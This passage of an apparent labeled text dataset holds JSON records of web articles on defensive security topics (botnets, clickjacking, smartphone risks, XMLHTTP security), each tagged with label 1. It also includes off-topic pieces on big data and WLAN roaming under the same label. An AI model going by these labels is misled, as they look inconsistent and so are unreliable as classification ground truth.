network analyzer.\nFinally, to protect against Trojan Horse login programs, the server should be physically secured, closely monitored, and should automatically log off unattended sessions.", "label": 1}
{"text": "Consumers and companies today rely on the Internet to perform all manner of tasks, from conducting business, to buying and selling personal items to managing their lives, friendships and family interactions. However, working and living online exposes everyone to successive waves of hacks, scams, and other digital exploits – threats unimagined only a few years ago.\nEnterprise IT and corporate management are spending increasing time, energy, and funds on securing digital and physical assets with technology of growing complexity. Strong encryption, multifactor biometrics, intrusion detection, anti-malware software and other advanced security measures provide necessary protection against a range of threats, but a simple truth remains: Verification before a transaction (or a security breach) occurs is always cheaper and more effective than attempting to remedy the consequences of failing to do so.\nInternet security today is built on a fragile combination of robust transport authentication mechanisms like SSL and SSH, strong public and private key encryption, and password and CAPTCHA regimes. Unfortunately, encryption and transport security do little to address vulnerabilities at the endpoints — servers and the personal devices used to access them. And, authentication solutions such as passwords, CAPTCHA and tokens have been shown to be vulnerable to attack.\nIntelligent authentication via the phone\nMobile phones are today the most ubiquitous devices on earth. In 2011, the United Nations estimates that more than five billion people worldwide own mobile phones and subscribe to voice and messaging plans and other services. Complement that number with 1.2 billion landlines and a growing number of Internet (VoIP) phones for majority coverage of today’s global population of nearly 7 billion people.\nMobile phones and landlines present key advantages for verification and authentication regimes:\nPhoneID provides detailed information about phone type and registration location information globally. Scammers and fraudsters often rely on untraceable pre-paid phones or VoIP numbers that they can acquire in bulk to spam and scam online users. PhoneID helps companies identify such anonymous, location-independent telephone numbers, and block or flag these users and their associated transactions.\nTelephone Verification entails using a supplied telephone number for one-time authentication of online user identity. It calls or sends a text to the user supplied phone number with a PIN that gives users the opportunity to verify their identity in establishing an account or even for each login to the account. Combined with PhoneID, telephone verification forms a robust out-of-band authentication method.\nFor example, Name.com, an accredited domain registrar and web hosting company, has a multi-layered fraud defense strategy, using telephone verification together with other fraud prevention products to eliminate more than $1.5 million in annual online fraud.\nDomain registrars are frequently targeted by fraudsters, as compromised domain names are easy gateways for scamming customers of banks, cloud services companies, e-commerce and other websites. By stealing and redirecting domain names, fraudsters can intercept traffic and spoof websites to “phish” for credentials, compromise user accounts, and siphon off funds and personal data. In recent years, Name.com experienced 10 to 12 percent annual fraud rates. By employing fraud prevention solutions to flag suspicious orders and create audit trails with intelligent authentication, Name.com reduced the time and manpower needed to identify fraudulent orders and cut illegal domain purchases by 97 percent.\nPhone verification/identification is fast becoming a core security solution for online companies. It’s used by organizations of all sizes including some of the world’s largest and most prominent Web businesses. It’s also in use by in multiple industries such as social media, lead generation, classifieds, financial services, healthcare, eCommerce and cloud-based services.\nVerification is not merely a piece of larger security routines. Verification lets users, employers, and vendors build and leverage online reputation for applications that include:\nIn short, verification is key to securing online activities where knowing who is attempting to access digital assets is as important as what that person is doing.\nBenefits for Solutions Providers\nBy offering telephone verification along with other complementary security products, solutions providers can reap many benefits. They include:\n- Protecting The Business From Cloud Application Security Risks\n- The Massive SaaS Opportunities For VARs\n- A Reseller's Guide: Recipe For Channel Partnership Success\n- Cloud Connection: Seven Steps To Effective Public Cloud Services\n- From CapEx To OpEx: Channel Strategy In The Federal Push To The Cloud\n- A Reseller's Guide: Coming Out On Top In The Face Of Channel Conflict\n- How To Create A Case For Disaster Recovery Plan\n- How To Offset Your Customers' BYOD Risks\n- How To Ease Client Anxiety About Private Cloud Deployments\n- How An SMB Cloud Provider Can Create 'Swagger' In A Competitive Market\n- A Reseller's Guide: Creating A Successful Solution Provider Event\n- How to Prepare for the Future of the IT Solutions Industry\n- How to Consolidate Data Protection Services for Greater Customer Value\n- 10 Attributes to Support Revenue Marketing and Sales Success.\n- How To Improve Efficiency: Upgrade Mountain Lion and iOS6\n- How To Cash In On the Cloud Through Collaboration\n- How To Sell Cloud Storage In Five Steps\n- How To Protect High-Value Data Assets\n- Moving Data to the Cloud: Options for SMBs and Small Enterprises\n- How To Apply Big Data Security Analytics to Detect Advanced Threats and Breaches", "label": 1}
{"text": "Understanding Hidden Threats: Botnets\nYou've most likely heard of botnets. Still, even with all of the references to them in the news these days, it's not easy to gain a clear understanding of what they are, and how they might be affecting you. We've taken a few of the most common questions sent in by Lavasoft News readers, and answered them in plain and simple terms. Keep reading to set the facts on botnets straight.\nWhat is a botnet?\nA botnet is a network of compromised, or infected, computers that hackers have commandeered. PCs that are part of a botnet are often referred to simply as \"bots\".\nBotnets are part of the multilayered and profitable crimeware industry, where the initial step is to infect and take control of a targeted computer. PCs in a botnet are under the remote command and control of hackers. As part of that, hackers can take advantage of all of the resources on a machine (from personal information to bandwidth), and use it to perform malicious tasks under remote direction - all to carry out their criminal intentions.\nWhat is a zombie computer?\nA zombie computer is a system that has been infected and taken over remotely by cyber criminals. A collection of zombie computers makes up a botnet.\nWhat are botnets used for?\nBotnets are controlled remotely by hackers to distribute spam, viruses, and theft schemes - and to hijack additional computers. The main motivation behind botnets, in recent years, is for monetary gain by cyber criminals. Once compromised, cyber criminals have complete access to the infected machine; they are able to load software onto it, or pull information off of it.\nBot herders, the hackers who control botnets, can instruct thousands of computers to follow their orders, whether it's to propagate spam messages, launch fraud schemes or to issue denial of service attacks, targeting certain, often high-profile, websites in order to make them unavailable to users. Once bot herders compile a group of compromised machines, they can sell it to fraudsters who are then capable of using the exploited machines for identity and data theft.\nHow do I know if my computer is part of a botnet?\nMost owners of compromised PC are unwitting victims, never realizing that they have allowed unauthorized access to their computers. Machines are infected without the knowledge of the computer user; usually access to the system is gained through a virus, worm, or Trojan. The symptoms of infection are generally very subtle and are not immediately apparent to the average computer user without using special tools. Still, there are telltale signs and symptoms which may indicate a problem.\n- A slow computer\nThe most apparent sign, according to the analysts as Lavasoft Malware Labs, is \"slow computer\" syndrome: your Internet connection becomes strangely sluggish, or your PC gets slower as you run a few programs on it simultaneously. (However, users should note that this can also be caused by other types of malware, as well as other PC problems.)\n- Accused of sending spam\nBeing accused of sending spam is a sign that your system is infected and is part of a spam bot.\n- Detecting malware responsible for bots\nBy running an anti-spyware and anti-virus program, the security software will be able to root out an infection and classify it as a bot.\n- An unknown or suspicious process is running in the background on your PC\nIf you use a firewall to monitor network traffic, the program will allow you to spot suspicious traffic on your PC.\nFor more technically-oriented computer users, bot activity can be discovered through packet sniffer tools and knowledge about different protocols, ports, Windows Registry, processes and TCP/IP. This includes:\n- Large amounts of network traffic\nBots often connect to remove servers; they may use a questionable amount of bandwidth and cause network traffic even if you are not online.\n- IRC Traffic\nInternet Relay Chat (IRC) is a type of real-time Internet messaging, designed mainly for group discussion forums. IRC bots connect to IRC as a client, performing automated functions but appearing to be another IRC user.\n- SMTP Traffic\nSimple Mail Transfer Protocol (SMTP) is an Internet standard for e-mail across IP networks. Bots may use a built-in SMTP-engine to send spam to other users.\n- Open Ports\nOpen ports allows applications to multitask and use different protocols at the same time. All computer devices on a network need a channel to allow them to communicate with each other. Bots may search for open ports to be able to start a synchronization or communication.\nTo learn more about the specific steps you should be taking to prevent your system from becoming part of a botnet, read our next article, How To Guide: Preventing Bot Infections.", "label": 1}
{"text": "Big Data – What Is It?\nBig data is a popular term used to describe the exponential growth, availability and use of information, both structured and unstructured. Much has been written on the big data trend and how it can serve as the basis for innovation, differentiation and growth.\nAccording to IDC, it is imperative that organizations and IT leaders focus on the ever-increasing volume, variety and velocity of information that forms big data.1\n- Volume. Many factors contribute to the increase in data volume – transaction-based data stored through the years, text data constantly streaming in from social media, increasing amounts of sensor data being collected, etc. In the past, excessive data volume created a storage issue. But with today's decreasing storage costs, other issues emerge, including how to determine relevance amidst the large volumes of data and how to create value from data that is relevant.\n- Variety. Data today comes in all types of formats – from traditional databases to hierarchical data stores created by end users and OLAP systems, to text documents, email, meter-collected data, video, audio, stock ticker data and financial transactions. By some estimates, 80 percent of an organization's data is not numeric! But it still must be included in analyses and decision making.\n- Velocity. According to Gartner, velocity \"means both how fast data is being produced and how fast the data must be processed to meet demand.\" RFID tags and smart metering are driving an increasing need to deal with torrents of data in near-real time. Reacting quickly enough to deal with velocity is a challenge to most organizations.\nBig data according to SAS\nAt SAS, we consider two other dimensions when thinking about big data:\n- Variability. In addition to the increasing velocities and varieties of data, data flows can be highly inconsistent with periodic peaks. Is something big trending in the social media? Perhaps there is a high-profile IPO looming. Maybe swimming with pigs in the Bahamas is suddenly the must-do vacation activity. Daily, seasonal and event-triggered peak data loads can be challenging to manage – especially with social media involved.\n- Complexity. When you deal with huge volumes of data, it comes from multiple sources. It is quite an undertaking to link, match, cleanse and transform data across systems. However, it is necessary to connect and correlate relationships, hierarchies and multiple data linkages or your data can quickly spiral out of control. Data governance can help you determine how disparate data relates to common definitions and how to systematically integrate structured and unstructured data assets to produce high-quality information that is useful, appropriate and up-to-date.\nUltimately, regardless of the factors involved, we believe that the term big data is relative; it applies (per Gartner’s assessment) whenever an organization’s ability to handle, store and analyze data exceeds its current capacity.\nExamples of big data\n- RFID (radio frequency ID) systems generate up to 1,000 times the data of conventional bar code systems. Tweet\n- 10,000 payment card transactions are made every second around the world.2 Tweet\n- Walmart handles more than 1 million customer transactions an hour.3 Tweet\n- 340 million tweets are sent per day. That's nearly 4,000 tweets per second.4 Tweet\n- Facebook has more than 901 million active users generating social interaction data.5 Tweet\n- More than 5 billion people are calling, texting, tweeting and browsing websites on mobile phones. Tweet\nUses for big data\nSo the real issue is not that you are acquiring large amounts of data (because we are clearly already in the era of big data). It's what you do with your big data that matters. The hopeful vision for big data is that organizations will be able to harness relevant data and use it to make the best decisions.\nTechnologies today not only support the collection and storage of large amounts of data, they provide the ability to understand and take advantage of its full value, which helps organizations run more efficiently and profitably. For instance, with big data and big data analytics, it is possible to:\n- Analyze millions of SKUs to determine optimal prices that maximize profit and clear inventory.\n- Recalculate entire risk portfolios in minutes and understand future possibilities to mitigate risk.\n- Mine customer data for insights that drive new strategies for customer acquisition, retention, campaign optimization and next best offers.\n- Quickly identify customers who matter the most.\n- Generate retail coupons at the point of sale based on the customer's current and past purchases, ensuring a higher redemption rate.\n- Send tailored recommendations to mobile devices at just the right time, while customers are in the right location to take advantage of offers.\n- Analyze data from social media to detect new market trends and changes in demand.\n- Use clickstream analysis and data mining to detect fraudulent behavior.\n- Determine root causes of failures, issues and defects by investigating user sessions, network logs and machine sensors.\n\"High-performance analytics, coupled with the ability to score every record and feed it into the system electronically, can identify fraud faster and more accurately.\"\nMany organizations are concerned that the amount of amassed data is becoming so large that it is difficult to find the most valuable pieces of information.\n- What if your data volume gets so large and varied you don't know how to deal with it?\n- Do you store all your data?\n- Do you analyze it all?\n- How can you find out which data points are really important?\n- How can you use it to your best advantage?\nUntil recently, organizations have been limited to using subsets of their data, or they were constrained to simplistic analyses because the sheer volumes of data overwhelmed their processing platforms. What is the point of collecting and storing terabytes of data if you can't analyze it in full context, or if you have to wait hours or days to get results? On the other hand, not all business questions are better answered by bigger data.\nYou now have two choices:\n- Incorporate massive data volumes in analysis. If the answers you are seeking will be better provided by analyzing all of your data, go for it. The game-changing technologies that extract true value from big data – all of it – are here today. One approach is to apply high-performance analytics to analyze the massive amounts of data using technologies such as grid computing, in-database processing and in-memory analytics.\n- Determine upfront which big data is relevant. Traditionally, the trend has been to store everything (some call it data hoarding) and only when you query the data do you discover what is relevant. We now have the ability to apply analytics on the front end to determine data relevance based on context. This analysis can be used to determine which data should be included in analytical processes and which can be placed in low-cost storage for later availability if needed.\n\" Now you can run hundreds and thousands of models at the product level – at the SKU level – because you have the big data and analytics to support those models at that level.\"\nA number of recent technology advancements are enabling organizations to make the most of big data and big data analytics:\n- Cheap, abundant storage and server processing capacity.\n- Faster processors.\n- Affordable large-memory capabilities, such as Hadoop.\n- New storage and processing technologies designed specifically for large data volumes, including unstructured data.\n- Parallel processing, clustering, MPP, virtualization, large grid environments, high connectivity and high throughputs.\n- Cloud computing and other flexible resource allocation arrangements.\nBig data technologies not only support the ability to collect large amounts of data, they provide the ability to understand it and take advantage of its value. The goal of all organizations with access to large data collections should be to harness the most relevant data and use it for optimized decision making.\nIt is very important to understand that not all of your data will be relevant or useful. But how can you find the data points that matter most? It is a problem that is widely acknowledged. \"Most businesses have made slow progress in extracting value from big data. And some companies attempt to use traditional data management practices on big data, only to learn that the old rules no longer apply,\" says Dan Briody, in the 2011 Economist Intelligence Unit's publication, \"Big Data: Harnessing a Game-Changing Asset.\"\nBig data solutions from SAS\nHow can you make the most of all that data, now and in the future? It is a twofold proposition. You can only optimize your success if you weave analytics into your big data solution. But you also need analytics to help you manage the big data itself.\nThere are several key technologies that can help you get a handle on your big data, and more important, extract meaningful value from it.\n- Information management for big data. Many vendors look at big data as a discussion related to technologies such as Hadoop, NoSQL, etc. SAS takes a more comprehensive data management/data governance approach by providing a strategy and solutions that allow big data to be managed and used more effectively.\n- High-performance analytics. By taking advantage of the latest parallel processing power, high-performance analytics lets you do things you never thought possible because the data volumes were just too large.\n- High-performance visual analytics. High-performance visual analytics lets you explore huge volumes of data in mere seconds so you can quickly identify opportunities for further analysis. Because it's not just that you have big data, it's the decisions you make with the data that will create organizational gains.\n- Flexible deployment options for big data. Flexible deployment models bring choice. High-performance analytics from SAS can analyze billions of variables, and those solutions can be deployed in the cloud (with SAS or another provider), on a dedicated high-performance analytics appliance or within your existing IT infrastructure, whichever best suits your organization's requirements.\n1 Source: IDC. \"Big Data Analytics: Future Architectures, Skills and Roadmaps for the CIO,\" September 2011.\n2 Source: American Bankers Association, March 2009\n3 Source: http://www.economist.com\n4 Source: http://blog.twitter.com\n5 Source: http://newsroom.fb.com/", "label": 1}
{"text": "SEAS Information Security Tips\nYou may feel like \"nothing I have on my computer is worth protecting, and they wouldn't bother with me anyway.\" But the truth is that a vulnerable computer can be the starting point for other attacks on our network. A hacker may not be interested in your computer specifically but rather may hijack your computer for use in remote proxy attacks such as a Distributed Denial of Service (DDoS), thereby becoming a threat to someone else's computer. Most attacks come from automated cracking programs which simply try to break into every machine on the Internet. When they break into one computer, they copy themselves to that machine so that it can try to break into yet more machines. So no one is choosing to break into your machine specifically, but your machine needs to be secure for the welfare of other computers on the network.\nBelow are some basic concepts and practices that will not only protect you and your data, but the whole Penn computing community. As an Eniac user, you are required to keep your account secure to protect the entire system.\n1. Don't open email attachments, unless you are expecting them. Don't send email attachments using any of the extensions listed in the Answers article on Prohibited Attachments, they will be interpreted as viruses and blocked. Email containing these types of attachments is automatically deleted and there is no way to recover it.\n2. Lock your computer when you are away from your desk in the office, lab, or college house, even just for a minute. To lock a Windows machine, press ctrl-alt-delete and click the \"Lock Computer\" button.\n3. Don't share your password with anyone. If you have a shared account, use a different password for it. Also, don't use the same password on different sites. For example, don't use the same password for your bank account and for your email. Don't write your passwords down. The best place to keep your passwords is in your head.\n4. Install and run Antivirus software and keep it up-to-date. Penn provides site-licensed copies of Symantec AntiVirus to Penn users at no cost. Visit http://www.upenn.edu/computing/virus/ to download a copy. Once it's installed, be sure to run \"LiveUpdate\" to get the latest virus signature files on a regular basis. You can set up LiveUpdate to automatically go out and get updates (see directions below)\nTo automate Symantec LiveUpdates:\nRight-click on the Symantec shield icon in the lower right corner of\nthe display and select \"Open Symantec Antivirus\". Select Schedule\nUpdates from the File pull-down menu. Put a check in the box next to\n\"Enable scheduled automatic updates\". Click the Schedule button.\nUnder Frequency, click the button next to Daily. Select a convenient\ntime for the updates to take place. Click OK.\n5. Keep your operating system patches up-to-date. It's recommended to run Windows Update regularly.\n6. Don't let anyone modify your account or your computer, unless you trust them.\n7. Make sure your system security settings are correct. Download and run Microsoft Baseline Security Analyzer. Microsoft released this as a response to the Code Red and Nimda worms a few years ago. It's designed to identify common security misconfigurations.\n8. Remove bad software - don't install spyware, peer-to-peer software, or \"toolbars\". Run Spybot Search and Destroy daily to detect and remove spyware. Update it weekly. (http://download.com.com/3000-8022-10122137.html)\n9. If someone gets a message with your address in the \"From\" line, this doesn't mean your account was broken into. Similarly, just because you get a bounced message from a message you never sent, doesn't mean your account was broken into. Delete these messages, they are spam.\n10. Run the \"Shields Up\" scan, an Internet security vulnerability profiling free service. This scan will identify exposed areas on your computer that intruders could use to probe and hack into. Open ports make it easy for intruders to steal your personal information, credit card numbers, and so forth through your computer's insecure connection to the Internet. Do what you can to fix the security problems the \"Shields Up\" scan reports. There is a lot of helpful information on the site. Go to \"Shields Up\" Scan\n11. Install a firewall on your computer. CETS technicians will install and set up a firewall on SEAS staff and faculty computers located in SEAS offices.\nOther Related Links\nIf you have any questions about computer security, please send mail to firstname.lastname@example.org. Please be as detailed as possible.", "label": 1}
{"text": ", SecurityFocus 2008-09-30\nWhat's the harm in clicking on a button?\nThat's the central question being discussed by security professionals following the cancellation of a presentation on user-interface overlays -- or \"clickjacking\" as some have dubbed the threat -- at last week's Open Web Application Security Project (OWASP) AppSec conference in New York City.\nOn Friday, the U.S. Computer Emergency Readiness Team (US-CERT) warned network administrators to beware of the technique.\n\"Clickjacking gives an attacker the ability to trick a user into clicking on something only barely or momentarily noticeable,\" the group stated. \"Therefore, if a user clicks on a web page, they may actually be clicking on content from another page.\"\nTwo researchers, Robert Hansen and Jeremiah Grossman, planned at AppSec to discuss the threat of using Web graphics to persuade a victim to click where an attacker wants on a page. The technique, which is also known as well as user-interface (UI) redressing and IFRAME overlay, can be used by an attacker to hide a button or link on a legitimate page, such as a bank's account page or Web mail application, using other Web content to mask the page's context.\nA Web user might think, for example, that they are clicking on a button to close a dialog box, when the button press in reality deletes all their e-mail messages in Gmail. Or, a user might believe they are clicking on a button to decline to take a survey, when they are actually transferring money from their bank. The technique could be used to raise an article's Digg score or get paid for a pay-for-click advertisement, said Grossman, the chief technology officer for Web security firm White Hat Security.\n\"The list is virtually endless and these are the more relatively harmless examples,\" he told SecurityFocus in an e-mail interview. \"Next consider that an attack can invisibly hover these buttons below the users mouse, so that when the clicks on something the visually see, they actually are clicking on something the attacker wants them to. Now, what could the bad guy potentially do with that ability? The more we researched, the worse the exploits become.\"\nHansen and Grossman canceled their presentation after demonstrating to software maker Adobe that one of its products could be affected by the attack.\n\"While they saw this issue as primarily a web browser issue, they showed us that one of their demos included an Adobe product,\" David Lenoe, a program manager for Adobe's Product Security Incident Response Team (PSIRT), said in a blog post. \"We worked together with Robert and Jeremiah to assess the impact of this issue, and they determined that it was in our customers best interest to refrain from making this issue public until Adobe and web browser vendors have a chance to provide a fix or fixes to our mutual customers.\"", "label": 1}
{"text": "PC virus celebrates 20th birthday\nMany unhappy returns\nAnalysis Today, 19 January is the 20th anniversary for the appearance of the first PC virus. Brain, a boot sector virus, was let loose in January 1986. Brain spread via infected floppy disks and was a relatively innocuous nuisance in contrast with modern Trojan, rootkits and other malware. The appearance of the first Windows malware nonetheless set in train a chain of events that led up to today's computer virus landscape.\nBoot sector viruses ceased to appear when floppy discs went out of fashion but they continued to be a nuisance between 1986 to 1995, when internet technology started to penetrate the consumer market. These types of viruses relied on people to exchange infected discs and virus outbreaks often took months to spread.\nThe creation of macro viruses, which exploited security weaknesses in Microsoft word and other applications, meant that malware outbreaks peaked after days instead of weeks and months. Macro viruses ruled the roost for around four years between 1995 and 1999 before email became the main vector for viral distribution.\nHarnessing the internet meant that the time it took the first email worms, such as the Love Bug, to spread dropped from days to hours. Email worms such as the Love Bug and Melissa caused widespread disruption and confusion in 1999 before they were brought to heel.\nBy 2001, network worms such as Blaster were created that automatically and indiscriminately infected Windows PCs without adequate protection. Email and network worms remain a problem today but the greatest problem these days is posed by key-logging Trojans designed to snoop on user's private information, such as online account details, and the many strains of malware that turn infected PCs into zombie drones under the control of hackers.\nThe biggest change over the last 20 years has been in the motives of virus writers rather than in the types of malware they've cooked up, according to anti-virus firm F-Secure.\n\"The most significant change has been the evolution of virus writing hobbyists into criminally operated gangs bent on financial gain,\" said F-Secure's chief research officer Mikko Hypponen. “This trend is showing no signs of stopping.\"\n\"There are already indications that malware authors will target laptop WLANs as the next vector for automatically spreading worms,\" he added. ®", "label": 1}
{"text": "WLAN Roaming - the basics\nEven if you keep the same IP address, things get complicated.\nWhen a WLAN client moves from the range of one Access Point (AP) to another in the same subnet, it needs to find the best AP, decide when to roam onto it, associate with it and do any authentication required, as per your security policies. Then the wired network has to relearn the location of the client, so that data can be sent to it. All of this takes time and this is without the client having to worry about getting a new IP address! The scanning and decision making part of the roaming process (see How to Make your WLAN roam faster) allows the client to find a new AP on an appropriate channel as the user moves. When this happens, the client must associate with the new AP. It must then, assuming that it is an 802.1x supplicant (see The EAP Heap), reauthenticate with the RADIUS server. This is transparent to the user - but the delay in this happening may not be. It can take up to a second for association and authentication to occur (see below for implications and solutions). IAPP\nThe next part of the process is for the rest of the network to be made aware that the client has shifted. This calls for AP to AP communication, which was never catered for in the original 802.11 spec. Vendors had their own way of passing updates; however 802.11f, the Inter-Access Point Protocol, has now been now published by the IEEE as a trial-use standard - it sits in this state for two years before being submitted as a full-use standard - to facilitate multi-vendor AP interoperability. IAPP calls for the new servicing AP to send out two packets onto the wired LAN. One of these is actually set with the source address of the client (the standard says this should be a broadcast, however some implementations still use unicast to the previous AP or a multicast) and is used by intervening switches to update their MAC address tables with the client’s new location. The other is an IAPP ADD-notify packet from the new AP to an IAPP multicast address that all APs subscribe to, which contains the MAC address of the station it has just associated. All APs will receive this packet, and the one that had been associated with that station will use the sequence number included to determine that this is newer information and remove the stale association from its internal table. IAPP provides for the sharing of information between APs. The format of this information is specified, as \"contexts\" but the actual content is not defined, so it’s not yet hugely useful as far as vendor interoperability is concerned. Also IAPP has no specific provision for security. Who Cares?\nSo, worst case, you’re probably looking at about one second where your client can’t be reached over the network. For a lot of clients and applications, this isn’t an issue. If you’re walking from one room to another carrying your laptop, and you want to use email or a web browser, it’s not a problem. In fact, most TCP-based applications will be able to handle this sort of hiccup (remember that in this instance there’s no address change). UDP applications are less able to handle interruptions, and unfortunately, these are the ones where a break would be most noticed by the user. The killer? Voice. Not only is VoWLAN UDP-based for the bearer traffic, but it’s also the one application where you are likely to be using it as you move between APs. And you are definitely going to notice a one second hit. Which is presumably why the vendors that are pushing fast roaming for 802.11 are the ones squarely behind the use of wireless handsets in an IP Telephony environment, such as Cisco, SpectraLink and Symbol. Related standards\nIn fact these are three of the companies behind the drive for a new IEEE Working Group to create a standard to handle faster Layer 2 roaming. There are several related standards and works-in-progress, but none that actually cover this specific aspect:\n- As already discussed, IAPP—802.11f—isn’t designed for speed.\n- 802.11i, the security standard (not yet ratified) has provision for secure fast handoff, but it’s too security specific for this requirement.\n- 802.11k—Radio Resource Management—might help in that it should cater for faster discovery of APs. Again, not yet finalised.\n- 802.21 isn’t specifically for wireless LANs at all. It’s aimed at the handoff between heterogeneous networks (wired, 802.11, Bluetooth) and while it will deal with inter-ESS roaming (ie subnet to subnet in a WLAN), it won’t speed up the Layer 2 process which is needed prior to any Layer 3 interaction. This was the P802 Handoff Study Group, and is just in the process of kicking off now.\nIn the meantime of course, there are proprietary solutions. The two parts that need to be speeded up to cut down outage times are the scanning process (to allow clients to find new suitable APs to associate to), and, specifically for security, a faster way of reauthenicating to cut out the RADIUS request/response process. There are things that can be done to speed up the time it takes for a client to find another suitable AP. An AP can maintain information on its adjacent APs, which it can pass to a client on request—this will give the client a better indication of usable channels to scan, for example. The biggest time saver, however, is reckoned to be in localising the 802.1x authentication process. Cisco has incorporated Fast Secure Roaming into its Wireless Domain Services (WDS) portfolio as part of its Structured Wireless Aware Networking offering, which in effect allows an AP on each local subnet to act as the authenticator for clients. When a client (or other AP) goes through the initial RADIUS authentication, it does it via one AP running WDS. This lets that AP establish shared keys between itself and every other entity in the L2 domain, and allows for quicker reauthentication. Plans are for this capability to be included in Cisco’s router/switch platforms later this year as part of its SWAN development. Symbol provides similar functionality in its hardware, while Airespace) also caters for fast roaming in its wireless switches and appliances, and companies such as Bluesocket, which use gateways to control pretty dumb APs, manage everything centrally. Proxim handles things differently, pre-authenticating clients to nearby APs as well as the one currently in use in preparation for the client moving. So before you get excited about Layer 3 roaming, make sure you understand how your vendor of choice implements it at Layer 2. If that bit’s not fast enough to stop you losing traffic, you’ll never be able to move across subnets. It’s likely to be years before there’s a usable standard in place and in the meantime while you can probably get APs from different vendors to work together, there’s no guarantee of interoperability if you want to turn on their various fast roaming options.", "label": 1}
{"text": "COMMON RISKS FOR SMARTPHONES\nWe usually do a good job of protecting our computers, but what about smartphones? Careless use can open up users to a lot of risks. Take a moment to consider each of these areas:\nLoss of device and information theft. Smartphones are small and can easily be lost or stolen. Unauthorized users may access your accounts, address lists, photos, and more to scam, harm, or embarrass you or your friends. They may leverage stored passwords to access your bank and credit card accounts, steal your money, or make credit card charges. They may also gain access to sensitive material.\nSocial engineering. A common mobile threat is social engineering. Whether via text message, image, or application (app) to download, an incoming communication may be an attempt to gain access to your information. A current example consists of a text message that comes from an unknown number telling you that if you click on the link provided, you will have access to thousands of free ringtones. If this sounds too good to be true, that is because it is. The link is a malicious link. Clicking on it will compromise the security of your smartphone.\nTMI (too much information). Guidelines for protecting privacy, safety, and reputation when sharing via computers also apply when sharing via smartphones.\nPublic Wi-Fi. Smartphones are susceptible to malware and hacking when leveraging unsecured public networks.\nBluetooth® and near field communications (NFC). Bluetooth is a wireless network technology that uses short-wave radio transmissions to transmit voice and data. NFC allows for smartphones to communicate with each other by simply touching (“bumping”) another smartphone, or being in close proximity to another smartphone with NFC capabilities or an NFC device. Risks with using NFC and Bluetooth include eavesdropping, through which the cybercriminal can intercept your personal data. NFC also has the risk of transferring viruses or other malware from one NFC-enabled device to another.\nSIMPLE STEPS TO PROTECT YOUR SMARTPHONE\nUpdate the operating system. Smartphones are computing devices that need to be updated. Updates often provide you with enhanced functionality and enriched features, as well as fixes to critical security vulnerabilities. Your smartphone manufacturer should notify you whenever an update is available.\nUse of security software is a must. As the smartphone market is increasing, so too is the amount of malware designed to attack smartphones. The software security solutions that are available for desktops and laptops are not as widely available for smartphones. A key protection is to use mobile security software and keep it up to date. Many of these programs can also locate a missing or stolen smartphone, back up your data, and even remotely wipe all data from the smartphone if it is reported stolen.\nPassword-protect your device. Enable strong password protection on your device and include a timeout that requires authentication after a period of inactivity. Secure the smartphone with a unique password – not the default one it came with. Do not share your password with others.\nThink before you click, download, forward, or open. Before responding, registering, downloading, or providing information, get the facts. No matter how tempting the text, image, or application is, if the download is not from a legitimate app store or the site of a trusted company, do not engage with the message.\nBe cautious with public Wi-Fi. Many smartphone users use free Wi-Fi hotspots to access data and keep their smartphone plan costs down. There are numerous threats associated with Wi-Fi hotspots. To be safe, avoid logging into accounts, especially financial accounts, when using public wireless networks.\nDisable Bluetooth and NFC capabilities when not in use. Capabilities such as Bluetooth and NFC can provide ease and convenience in using your smartphone. They can also provide an easy way for a nearby, unauthorized user to gain access to your data. Turn these features off when they are not required.\nEnable encryption. Enabling encryption on your smartphone is one of the best ways to safeguard information stored on the device, thwarting unauthorized access.\nSecurely dispose of your device. With the constant changes and upgrades in the smartphone market, many are upgrading their devices on a regular basis. It is important that you wipe the information from your smartphone before disposal. Additionally, make sure any secure digital (SD) cards are removed and erased. If you are not redeploying the subscriber identity module (SIM) card to another device, then make sure your personal information stored on the SIM card is erased or destroyed.\nFor additional information, please consult these resources:\nAbout.com – 14 Ways to Find a Stolen or Lost iPhone: http://ipod.about.com/od/iphonetroubleshooting/tp/14-Ways-To-Find-A-Lost-Or-Stolen-Iphone.htm\nFTC – How to Dispose Your Mobile Device Securely:\nUniversity of Northern Colorado:\nUS-CERT – Cyber Threats to Mobile Phones:\nSophos – Android Tool:\nMicrosoft – Secure Your Smartphone:\nOur web site provides links to other web sites for convenience and informational purposes only. By accessing these links you will be leaving First Farmers State Bank's website and entering a website hosted by another party. Please be advised that you will no longer be subject to, or under the protection of, the privacy policies of First Farmers State Bank's website. We encourage you to read and evaluate the privacy policies on the site you are entering.", "label": 1}
{"text": "Helper API Security\nThis topic describes security issues associated with XMLHTTP and ServerXMLHTTP. In addition, it provides some guidance for mitigating security exposure.\nThe following sections provide information about Helper API security, with an emphasis on XMLHTTP.\nUse XMLHTTP Only on the Client\nXMLHTTP should only be used on the client. Because XMLHTTP is marked safe for scripting, you call XMLHTTP from a script that is executed in the client-side Internet browser. Remember, you can use XMLHTTP and ServerXMLHTTP in any arbitrary script, inside or outside the browser. XMLHTTP is not safe for server-side implementation. Using XMLHTTP on the server means that you would use XMLHTTP via JScript, VBScript, C++, ASP, or ASP.NET. XMLHTTP is not thread-safe - it doesn't work for multi-threaded scenarios. If you use XMLHTTP, you will not receive an error, but your script may not perform properly. If you need XMLHTTP functionality on the server, you should use ServerXMLHTTP, not XMLHTTP.\nXMLHTTP Uses Cached Credentials\nXMLHTTP uses cached credentials if the user does not provide new credentials for every open method call in scenarios where specific credentials are used. Kiosk-style applications using XMLHTTP for multiple users that share a single login should always ensure that they terminate the Internet Explorer process when a user finishes a session. Furthermore, kiosk-style applications should never display the address bar as part of the application.\nSet the Site Object to Prevent Cross-Site and Cross-Domain Attacks\nWhen using XMLHTTP outside of Internet Explorer, it is important to set the Site object to prevent cross-site and cross-domain access on calls to the open Method (IXMLHTTPRequest). If the Site object is set, on redirects the redirect target is automatically checked against the initial Open request, and the standard cross-zone and cross-domain checks are applied.\nIn Internet Explorer scripting scenarios, the Site is set by Internet Explorer.\nValidate the URL Before Calling Open in XMLHTTP\nYou should not accept untrusted data to construct a URL when calling the Open method. You should validate the data first, making sure that the user is allowed to enter only approved addresses. This is particularly important in scenarios outside of Internet Explorer when the Site object is not set, where it is up to you to prevent cross-domain and cross-site attacks.\nSpoofing and Best-Fit Character Attacks\nIn spoofing attacks, an attacker attempts to craft information that dupes software to accept the information, such as an HTTP request, as coming from a trusted third party. One approach is for the attacker to construct a URL, perhaps using escaped characters, so that it looks like a URL to a trusted site, when in fact it is a URL to a site that has been set up with malicious intent. Another method is to use best-fit character attacks, where higher order characters in a string resource are mapped to lower order characters by certain programming interfaces, either by accident or deliberately. For example, an attacker might submit a URL 